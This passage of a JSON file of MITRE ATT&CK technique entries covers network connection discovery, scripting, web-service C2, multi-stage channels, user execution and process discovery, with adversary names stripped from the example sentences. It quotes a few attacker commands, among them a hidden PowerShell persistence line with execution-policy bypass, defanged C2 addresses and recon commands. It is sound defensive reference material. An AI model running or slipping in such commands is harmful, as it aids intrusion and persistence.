      "can use `netsh wlan show profiles` to list specific Wi-Fi profile details.",
      "has enumerated IP addresses of network resources and used the netstat command as part of network reconnaissance. The group has also used a malware variant HIGHNOON to enumerate active RDP sessions.",
      "can enumerate routine network connections from a compromised host.",
      "After loading the keyword and phone data files  begins monitoring all network connections to and from the victim server.",
      "During  the threat actors used the `net session` `net use` and `netstat` commands as part of their advanced reconnaissance.",
      "can enumerate the current network connections of a host.",
      "During  the threat actors used  to discover network connections on remote systems.",
      "can use   and  to discover current TCP connections.",
      "has used  to monitor connections to specific ports.",
      "has retrieved a GUID associated with a present LAN connection on a compromised machine.",
      "uses the arp -a command.",
      "has used the BLOODMINE utility to collect data on web requests from Pulse Secure Connect logs.",
      "has used NetCat and PortQry to enumerate network connections and display the status of related TCP and UDP ports.",
      "was seen using NetSess to discover NetBIOS sessions.",
      "used the netstat -anpo tcp command to display TCP connections on the victim's machine.",
      "employed a PowerShell script called RDPConnectionParser to read and filter the Windows event log Microsoft-Windows-TerminalServices-RDPClient/Operational(Event ID 1024) to obtain network information from RDP connections.  has also used  from a compromised system to obtain network connection information.",
      "has tested if the localhost network is available and other connection capability on an infected system using command scripts.",
      "can use netstat and nbtstat to detect active network connections.",
      "has been used to execute netstat -ano on a compromised host.",
      "can use netstat to enumerate current network connections.",
      "can execute `netstat.exe -f` on a compromised machine.",
      "has a built-in utility command for netstat can do net session through PowerView and has an interactive shell which can be used to discover additional information.",
      "can list network connections.",
      "can use netstat to enumerate network connections.",
      "has the ability to execute the `netstat` command.",
      "has used net use to identify and establish a network connection with a remote host.",
      "has used `netstat` and other net commands for network reconnaissance efforts.",
      "can collect network connection information.",
      "has used `net use` and `netstat` to conduct internal discovery of systems. The group has also used `quser.exe` to identify existing RDP sessions on a victim.",
      "has the ability to gather TCP and UDP table status listings.",
      "has a plugin to retrieve information about all active network sessions on the infected server.",
      "can enumerate system network connections.",
      "can use a dashboard and U/I to display the status of connections from the FRP client and server.",
      "has used RDP to test network connections.",
      "has used commands such as `netstat` to identify system network connections.",
      "has enumerated existing network connections on victim devices."
    ],
    "id": "T1049",
    "name": "System Network Connections Discovery",
    "similar_words": [
      "System Network Connections Discovery"
    ]
  },
  "attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44": {
    "description": "Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macos being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. (Citation: Metasploit) (Citation: Metasploit),  (Citation: Veil) (Citation: Veil), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)",
    "example_uses": [
      "downloaded and launched code within a SCT file.",
      "embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened. The actors also used batch scripting.",
      "A Destover-like variant used by  uses a batch file mechanism to delete its binaries from the system.",
      "executes BAT and VBS scripts.",
      "makes modifications to open-source scripts from GitHub and executes them on the victim’s machine.",
      "uses a batch file to kill a security program task and then attempts to remove itself.",
      "To assist in establishing persistence,  creates %APPDATA%\\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\\OneDrive.ps1”.",
      "has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution. The group has also used an exploit toolkit known as Threadkit that launches .bat files.",
      "has used macros in Word documents that would download a second stage if executed.",
      "infected victims using JavaScript code.",
      "executes batch scripts on the victim’s machine.",
      "has used malicious macros embedded inside Office documents to execute files.",
      "used various types of scripting to perform operations, including Python and batch scripts. The group was observed installing Python 2.7 on a victim.",
      "has used shell and VBS scripts as well as embedded macros for execution.",
      "loads malicious shellcode and executes it in memory.",
      "uses Python for scripting to execute additional commands.",
      "uses a batch file to delete itself.",
      "dropper creates VBS scripts on the victim’s machine.",
      "executes shellcode and a script to decode Base64 strings.",
      "has used batch scripts in its malware to install persistence mechanisms.",
      "creates and uses a VBScript as part of its persistent execution.",
      "uses macOS' .command file type to script actions.",
      "used VBS and JavaScript scripts to help perform tasks on the victim's machine.",
      "uses VBScripts and batch scripts.",
      "has used macros in s as well as executed VBScripts on victim machines.",
      "adds a Visual Basic script in the Startup folder to deploy the payload.",
      "can uninstall malware components using a batch script. Additionally, a malicious Word document used for delivery uses VBA macros for execution.",
      "used Visual Basic Scripts (VBS), JavaScript code, batch files, and .SCT files on victim machines.",
      "performs most of its operations using Windows Script Host (Jscript and VBScript) and runs arbitrary shellcode .",
      "An  loader Trojan uses a batch script to run its payload.",
      "has used a Batch file to automate frequently executed post compromise cleanup activities.",
      "can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.",
      "has a VBScript for execution.",
      "has used VBScript and JavaScript files to execute its  payload.",
      "executes additional Jscript and VBScript code on the victim's machine.",
      "can execute commands with script as well as execute JavaScript.",
      "has used multiple types of scripting for execution, including JavaScript, JavaScript Scriptlets in XML, and VBScript.",
      "has used VBS, VBE, and batch scripts for execution.",
      "malware has used .vbs scripts for execution.",
      "has used various types of scripting for execution, including .bat and .vbs scripts. The group has also used macros to deliver malware such as  and .",
      "scans processes on all victim systems in the environment and uses automated scripts to pull back the results.",
      "One version of  consists of VBScript and PowerShell scripts. The malware also uses batch scripting.",
      "can use PowerSploit or other scripting frameworks to perform execution.",
      "has executed malicious .bat files containing PowerShell commands.",
      "uses batch scripts for various purposes, including to restart and uninstall itself.",
      "uses a module to execute Mimikatz with PowerShell to perform .",
      "has used various batch scripts to establish C2, download additional files, and conduct other functions.",
      "malware uses PowerShell and WMI to script data collection and command execution on the victim.",
      "has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.  has also used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.",
      "has used PowerShell on victim systems to download and run payloads after exploitation.",
      "has used encoded PowerShell scripts uploaded to  installations to download and install , as well as to evade defenses.",
      "has used PowerShell scripts to download and execute programs in memory, without writing to disk.",
      "has used batch scripting to automate execution of commands."
    ],
    "id": "T1064",
    "name": "Scripting",
    "similar_words": [
      "Scripting"
    ]
  },
  "attack-pattern--804c042c-cfe6-449e-bc1a-ba0a998a70db": {
    "description": "Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.\n\nThis mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)",
    "example_uses": [],
    "id": "T1051",
    "name": "Shared Webroot",
    "similar_words": [
      "Shared Webroot"
    ]
  },
  "attack-pattern--830c9528-df21-472c-8c14-a036bf17d665": {
    "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API 2024) Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "example_uses": [
      "used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.",
      "leverages legitimate social networking sites and cloud platforms (Twitter, Yandex, and Mediafire) for command and control communications.",
      "A  JavaScript backdoor has used Google Apps Script as its C2 server.",
      "uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.",
      "has used compromised WordPress blogs as C2 servers.",
      "communicates to the C2 server by retrieving a Google Doc.",
      "has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.",
      "has used Technet and Pastebin web pages for command and control.",
      "is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.",
      "MSGET downloader uses a dead drop resolver to access malicious payloads.",
      "leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.",
      "can use public cloud-based storage providers for command and control.",
      "has used AOL Instant Messenger for C2.",
      "uses cloud based services for C2.",
      "malware can use a SOAP Web service to communicate with its C2 server.",
      "communicates to servers operated by Google using the Jabber/XMPP protocol.",
      "The  malware communicates through the use of events in Google Calendar.",
      "uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server. It has also obfuscated its C2 traffic as normal traffic to sites such as Github.",
      "uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.",
      "One variant of  uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.",
      "The \"tDiscoverer\" variant of  establishes a C2 channel by downloading resources from Web services like Twitter and GitHub.  binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.",
      "uses Pastebin to store its real C2 addresses.",
      "uses the Dropbox cloud storage service for command and control.",
      "can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.  also collects C2 information via a dead drop resolver.",
      "Some  components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.",
      "uses Twitter as a backup C2 method. It also has a module designed to post messages to the Russian VKontakte social media site.",
      "has used an RSS feed on Livejournal to update a list of encrypted C2 server names.",
      "hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.",
      "has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2.",
      "During   downloaded tools from sites including file.io GitHub and paste.ee.",
      "has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.",
      "can download additional payloads from web services including Pastebin and top4top.",
      "can use Pastebin to receive C2 commands.",
      "has used Pastebin Gitee and GitLab for Command and Control.",
      "can download files from Dropbox using a hardcoded access token.",
      "has used a legitimate web service for evading detection.",
      "During  the threat actors used OneDrive and MediaFire to host payloads.",
      "has used Pastebin and Google Storage to host content for their operations.",
      "has used Google Drive and Dropbox to host files downloaded by victims via malicious links.",
      "has used GitHub to host its payloads to operate spam campaigns.",
      "can communicate with its operators by exploiting the Simplenote DropBox and the social media platform Facebook where it can create fake accounts to control the backdoor and receive instructions.",
      "has been downloaded to victim's machines from OneDrive.",
      "has used sslip.io a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption as part of their command and control.",
      "has downloaded scripts from GitHub.",
      "has used file-sharing services including WeTransfer TransferNow and OneDrive to deliver payloads.",
      "can be utilized to abuse `sslip.io` a free IP to domain mapping service as part of actor-controlled C2 channels.",
      "has used a legitimate compromised website to download DLLs to the victim's machine.",
      "has used Discord's content delivery network (CDN) to deliver malware and malicious scripts to a compromised host.",
      "has used web services including Paste.ee to host payloads.",
      "can download additional modules from actor-controlled Amazon S3 buckets.",
      "can download additional payloads hosted on a Discord channel.",
      "has been used by threat actors to proxy C2 connections to ngrok service subdomains.",
      "can retrieve its primary payload from public sites such as Pastebin and Textbin.",
      "has used the dogechain.info API to generate a C2 address.",
      "can use legitimate websites for external C2 channels including Slack Discord and MS Teams.",
      "has the ability to download malware from Google Drive.",
      "has used Amazon Web Services to host C2.",
      "downloads have been hosted on Google Docs.",
      "has used legitimate web services including Pastebin Dropbox and GitHub for C2 communications.",
      "has used DropBox URLs to deliver variants of .",
      "has used Amazon Web Services to host second-stage servers.",
      "has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.",
      "has used Dropbox Amazon S3 and Google Drive to host malicious downloads.",
      "During   used the Cloudflare services for C2 communications.",
      "has leveraged iplogger.org to send collected data back to C2.",
      "used compromised Google Workspace accounts for command and control.",
      "can utilize Microsoft OneDrive or Google Drive for command and control purposes.",
      "has used Google Firebase to download malicious installation scripts.",
      "has used web services to download malicious files.",
      "second stage payloads can be hosted as RAR files containing a malicious EXE and DLL on Discord servers.",
      "has the ability to use use Telegram channels to return a list of commands to be executed to download additional payloads or to create a reverse shell.",
      "uses a subdomain on the legitimate Cloudflare resource trycloudflare[.]com to obfuscate the threat actor's actual address and to tunnel information sent from victim systems.",
      "has used various links such as links with typo-squatted domains links to Dropbox files and links to fake Google sites in spearphishing operations."
    ],
    "id": "T1102",
    "name": "Web Service",
    "similar_words": [
      "Web Service"
    ]
  },
  "attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91": {
    "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",
    "example_uses": [
      "After initial compromise,  will download a second stage to establish a more permanent presence on the affected system.",
      "attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware.",
      "uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.",
      "An  downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.",
      "An  downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified it then requests a connection to 192.184.60[.]229 on TCP port 81.",
      "uses Microsofts TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down the threat actors can update the encoded IP address on TechNet to maintain control of the victims machines.",
      "has used multi-stage malware components that inject later stages into separate processes.",
      "can download additional modules and malware capable of using separate C2 channels.",
      "The  loader is used to download and execute the  backdoor.",
      "can download and execute additional payloads and modules over separate communication channels.",
      "Individual  implants can use multiple communication channels based on one of four available modes of operation.",
      "has used one C2 to obtain enumeration scripts and monitor web logs but a different C2 to send data back.",
      "attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server which performs louder interactions with the malware.",
      "After initial compromise  will download a second stage to establish a more permanent presence on the affected system.",
      "used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.",
      "can use one C2 URL for first contact and to upload information about the host computer and two additional C2 URLs for getting commands.",
      "has used a two-tiered C2 configuration with tier one nodes connecting to the victim and tier two nodes connecting to backend infrastructure.",
      "can communicate over a unique series of connections to send and retrieve data from exploited devices."
    ],
    "id": "T1104",
    "name": "Multi-Stage Channels",
    "similar_words": [
      "Multi-Stage Channels"
    ]
  },
  "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5": {
    "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).Adversaries may also deceive users into performing actions such as:* Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary* Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)* Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)* Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn)For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
    "example_uses": [
      "has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.",
      "has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.",
      "has sent emails containing malicious attachments or links that require users to execute a file or macro to infect the victim machine.",
      "attempted to get users to launch malicious attachments delivered via spearphishing emails.",
      "lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.",
      "has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.",
      "embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.",
      "makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.",
      "has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.",
      "has delivered malicious links and macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.",
      "has lured users to click links to malicious HTML applications delivered via spearphishing emails.",
      "has used various forms of spearphishing in attempts to get users to open links or attachments.",
      "attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.",
      "A Word document delivering  prompts the user to enable macro execution.",
      "has used spearphishing via a link to get users to download and run their malware.",
      "has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.",
      "attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.",
      "has sent spearphishing attachments attempting to get a user to open them.",
      "has used various forms of spearphishing attempting to get a user to open links or attachments.",
      "has sent spearphishing emails links and attachments attempting to get a user to click.",
      "has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.",
      "has leveraged multiple types of spearphishing in order to attempt to get a user to open links and attachments.",
      "has leveraged both Spearphishing Link and Spearphishing Attachment attempting to gain User Execution.",
      "attempted to get users to click on Microsoft Excel attachments containing malicious macro scripts.",
      "has attempted to get victims to open malicious files sent via email as part of spearphishing campaigns.",
      "has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.",
      "has attempted to get users to execute malware via social media and spearphishing emails.",
      "has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access.",
      "has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt or install remote management software onto a corporate workstation allowing  to take control of an authenticated system.",
      "requires users to interact with malicious attachments in order to start  installation.",
      "execution can rely on users directly interacting with malicious LNK files.",
      "has been distributed through a fake CAPTCHA that presents instructions to the victim to open Windows Run window (Windows Button + R) and paste clipboard contents (CTRL + V) and press Enter to execute a Base64-encoded PowerShell."
    ],
    "id": "T1204",
    "name": "User Execution",
    "similar_words": [
      "User Execution"
    ]
  },
  "attack-pattern--8df54627-376c-487c-a09c-7d2b5620f56e": {
    "description": "Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)\n\nFor ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)\n\nAdversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.",
    "example_uses": [
      "drops and executes a malicious CPL file as its payload."
    ],
    "id": "T1196",
    "name": "Control Panel Items",
    "similar_words": [
      "Control Panel Items"
    ]
  },
  "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580": {
    "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or Get-Process via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",
    "example_uses": [
      "lists the running processes.",
      "obtains a list of running processes.",
      "lists the running processes on the system.",
      "obtains a list of running processes through WMI querying and the ps command.",
      "lists the system’s processes.",
      "lists processes running on the system.",
      "lists running processes.",
      "gathers a list of processes using the tasklist command and then is sent back to the control server.",
      "Freenki malware lists running processes using the Microsoft Windows API.",
      "can obtain a list of running processes on the victim’s machine.",
      "checks the running processes on the victim’s machine.",
      "gets an output of running processes using the tasklist command.",
      "enumerates all running processes.",
      "identifies processes and collects the process ids.",
      "can obtain a list of running processes on the system.",
      "lists the current running processes on the system.",
      "lists the current processes running.",
      "uses the tasklist to view running processes on the victim’s machine.",
      "uses tasklist /v to check running processes.",
      "collects a list of running services with the command tasklist /v.",
      "performs the tasklist command to list running processes.",
      "can gather a list of processes.",
      "checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.",
      "can list all running processes.",
      "checks its parent process for indications that it is running in a sandbox setup.",
      "has the ability to list processes on the system.",
      "runs tasklist to obtain running processes.",
      "can get a list of the processes and running tasks on the system.",
      "can enumerate processes.",
      "creates a backdoor through which remote attackers can monitor processes.",
      "can gather a process list from the victim.",
      "creates a backdoor through which remote attackers can retrieve a list of running processes.",
      "Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.",
      "can list running processes.",
      "creates a backdoor through which remote attackers can retrieve lists of running processes.",
      "can enumerate processes.",
      "can list the running processes and get the process ID and parent process’s ID.",
      "has a tool that can list out currently running processes.",
      "has run tasklist on a victim's machine.",
      "malware can list running processes.",
      "has used  to get information on processes.",
      "may collect process information by running tasklist on a victim.",
      "An  loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.",
      "has gathered a process list by using .exe.",
      "collects information about running processes.",
      "has a command to upload information about all running processes to its C2 server.",
      "has a command to return a list of running processes.",
      "may collect information about running processes.",
      "can list running processes.",
      "can obtain information about running processes on the victim.",
      "obtains a list of running processes on the victim.",
      "has the capability to discover processes.",
      "collects current and parent process IDs.",
      "\"beacon\" payload can collect information on process details.",
      "has the capability to obtain a listing of running processes (including loaded modules).",
      "can send process listings over the C2 channel.",
      "can obtain a process list from the victim.",
      "collects information on running processes and environment variables from the victim.",
      "collects information about running processes from victims.",
      "collects its process identifier (PID) on the victim.",
      "can obtain information about process integrity levels.",
      "RAT is able to list processes.",
      "has the ability to search for a given process name in processes currently running in the system.",
      "contains a command to list processes.",
      "has the ability to enumerate processes.",
      "may gather a list of running processes by running tasklist /v.",
      "The OsInfo function in  collects a running process list.",
      "can be used to discover processes running on a system.",
      "The discovery modules used with  can collect information on process details.",
      "is capable of performing process listings.",
      "has a command to list the victim's processes.",
      "sets a WH_CBT Windows hook to collect information on process creation.",
      "contains the getProcessList function to run ps aux to get running processes.",
      "can list running processes.",
      "has a command to obtain a process listing.",
      "can use tasklist to collect a list of running tasks.",
      "looked for a specific process running on infected servers.",
      "malware gathers a list of running processes.",
      "After compromising a victim,  lists all running processes.",
      "Several  malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by  also gathers process times.",
      "actors obtained a list of active processes on the victim and sent them to C2 servers.",
      "surveys a system upon check-in to discover running processes using the tasklist /v command.",
      "uses the Microsoft  utility to list processes running on systems.",
      "performs process discovery using tasklist commands.",
      "uses the tasklist /v command to obtain a list of processes.",
      "can obtain a list of processes on a compromised host.",
      "collects a list of running processes.",
      "During  the threat actors used  to obtain a list of all running processes.",
      "has used malware to enumerate active processes.",
      "monitored running processes for instances of MsBuild.exe by hashing the name of each running process and comparing it to the corresponding value 0x53D525. It also extracted command-line arguments and individual arguments from the running MsBuild.exe process to identify the directory path of the Orion software Visual Studio solution.",
      "has the ability to enumerate loaded modules for a process..",
      "has enumerated running processes on targeted systems.",
      "uses the tasklist and wmic process get Capture ExecutablePath commands to gather the processes running on the system.",
      "can identify processes via C# methods such as GetProcessesByName and running  with the Python os.popen function.",
      "can obtain a list of processes running on the system.",
      "used the ps command to monitor the running processes on the system.",
      "has created a snapshot of running processes using `CreateToolhelp32Snapshot`.",
      "can identify installed security tools based on process names.",
      "is capable of enumerating the running processes on the system using pslist.",
      "can use the getprocesslist command to enumerate processes on a compromised host.",
      "has called CreateToolhelp32Snapshot to enumerate all running processes.",
      "will check victim systems to ensure only one copy of the malware is running.",
      "During the   used multiple command-line utilities to enumerate running processes.",
      "can obtain a list of running processes on the victims machine.",
      "can identify running processes and their names.",
      "has the ability to enumerate running processes on a compromised host.",
      "has the ability to list processes on the infected host.",
      "can obtain a list of running processes on a compromised host.",
      "has used the ps command to list processes.",
      "has used tools to identify running processes on the victim's machine.",
      "can enumerate processes on a victim machine through use of .",
      "can identify the process that owns remote connections.",
      "has a component to check for running processes to look for web browsers.",
      "can retrieve a list of running processes from a compromised machine.",
      "can collect information about running processes.",
      "can identify processes based on PID.",
      "looks for processes from a hard-coded list.",
      "will query running process information to determine subsequent program execution flow.",
      "has used `CreateToolhelp32Snapshot` `Process32First` and `Process32Next` API calls to enumerate the running processes in the system.",
      "can gather a list of processes running on the machine.",
      "searches for different processes on the system.",
      "can call `NtQuerySystemProcessInformation` with `SystemProcessInformation` to enumerate all running processes including associated information such as PID parent PID image name and owner.",
      "gathered a list of running processes on the system using tasklist /v.",
      "can enumerate the processes that run on the platform.",
      "checks for running processes on the victims machine.",
      "uses the tasklist to view running processes on the victims machine.",
      "can collect data on running and parent processes.",
      "can execute ProcessList for process discovery.",
      "has gathered information about running processes.",
      "can list the current running processes on the system.",
      "has a Process Watcher feature to monitor processes in case the client ever crashes or gets closed.",
      "has the ability to deploy a reconnaissance module to retrieve a list of the active processes.",
      "has used `tasklist` to enumerate processes.",
      "malware can collect a list of running processes on a system.",
      "enumerates processes via the tasklist command.",
      "can enumerate the current process on a compromised host.",
      "has the ability to use  to identify running processes.",
      "has a module to list the processes running on a machine.",
      "has a command to perform a process listing.",
      "has searched for rival malware and removes it if found.  has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools.",
      "can monitor processes for open browsers and custom banking applications.",
      "can use  to collect a list of running tasks.",
      "has executed the tasklist command.",
      "can check if the explorer.exe process is responsible for calling its install function.",
      "can check for specific processes associated with virtual environments.",
      "has the ability to list running processes on a compromised host.",
      "has used tasklist to enumerate processes.",
      "can enumerate all processes and locate specific process IDs (PIDs).",
      "includes subprojects that enumerate and identify information about  candidates.",
      "During  the threat actors used the `tasklist /s` command as well as `taskmanager` to obtain a list of running processes.",
      "has collected information about running processes.",
      "can enumerate running processes.",
      "has the ability to discover processes including `Bka.exe` and `BkavUtil.exe`.",
      "has the ability to identify running processes on an infected host.",
      "can enumerate current running processes on the targeted machine.",
      "has used tasklist to enumerate processes and find a specific string.",
      "can enumerate processes on a target system.",
      "has a command ps to obtain a listing of processes on the system.",
      "can enumerate running processes on a machine.",
      "has the ability to check running processes.",
      "loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's Microsoft.IdentityServer.ServiceHost.exe process.",
      "can identity the current process on a compromised host.",
      "has used  to obtain information from a compromised host.",
      "can discover processes on compromised hosts.",
      "can enumerate all running processes to compare hashes.",
      "has used the command cmd /c tasklist to get a snapshot of the current processes on the target machine.",
      "can list running processes on the localhost.",
      "can gather process information.",
      "has called GetCurrentProcess.",
      "has been used to monitor process lists.",
      "can monitor processes on a compromised host.",
      "can query and kill system processes.",
      "can list active processes running on the victims machine.",
      "has the ability to identify running processes and associated plugins on an infected host.",
      "can enumerate all processes on the victim's machine.",
      "can enumerate a list of running processes on a compromised system.",
      "checks the running processes on the victims machine.",
      "has the ability to cyclically enumerate running processes such as PServiceControl.exe PService_PDD.exe and other targets supplied through a hardcoded configuration.",
      "lists the systems processes.",
      "has used tasklist /v to determine active process information.",
      "can iterate through running processes every six seconds collecting a list of processes to capture from later.",
      "can enumerate all running processes and process information on an infected machine.",
      "can enumerate the process it is currently running under.",
